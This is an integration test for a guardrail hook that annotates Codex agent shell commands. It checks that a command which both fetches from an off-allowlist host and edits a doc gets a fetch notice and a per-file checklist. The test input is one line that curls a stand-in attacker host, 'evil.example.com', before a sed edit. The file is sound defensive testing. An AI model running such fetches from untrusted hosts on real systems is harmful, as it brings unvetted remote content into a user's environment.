// audits/hooks/guardrails-codex-fetch-edit.integration.test.ts — a Codex shell command that
// both fetches from an off-allowlist host and edits a doc carries the fetch notice, the edit
// advisory and the per-file checklist, like the Claude and Antigravity hooks.
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { spawnSync } from "node:child_process";
import { afterAll, describe, expect, it } from "vitest";
import { readTemplate } from "../../render/parts";

const GENERATED = fs.mkdtempSync(path.join(os.tmpdir(), "bkit-gr-codex-"));
afterAll(() => fs.rmSync(GENERATED, { recursive: true, force: true }));
const HOOK = path.join(GENERATED, "guardrails.cjs");
fs.writeFileSync(HOOK, readTemplate(path.resolve(".bkit/core/.codex/hooks/bkit-guardrails.cjs")));
fs.mkdirSync(path.join(GENERATED, "docs"), { recursive: true });
fs.writeFileSync(path.join(GENERATED, "docs", "testing.md"), "a\n");

function run(command: string): string {
  const res = spawnSync("node", [HOOK], {
    input: JSON.stringify({
      tool_name: "Bash",
      tool_input: { command },
      session_id: `gr-codex-${process.pid}-${Math.random().toString(36).slice(2)}`,
      cwd: GENERATED,
    }),
    encoding: "utf-8",
    cwd: GENERATED,
  });
  expect(res.status).toBe(0);
  const out = JSON.parse(res.stdout.trim()) as {
    hookSpecificOutput: { additionalContext: string };
  };
  return out.hookSpecificOutput.additionalContext;
}

describe("codex guardrails.cjs — fetch plus edit", () => {
  it("adds the per-file checklist for the edited doc beside the fetch notice", () => {
    const ctx = run("curl -s https://evil.example.com/x && sed -i s/a/b/ docs/testing.md");
    expect(ctx).toContain("outbound fetch");
    expect(ctx).toContain("docs/testing.md");
    expect(ctx).toMatch(/authoring/i);
  });
});
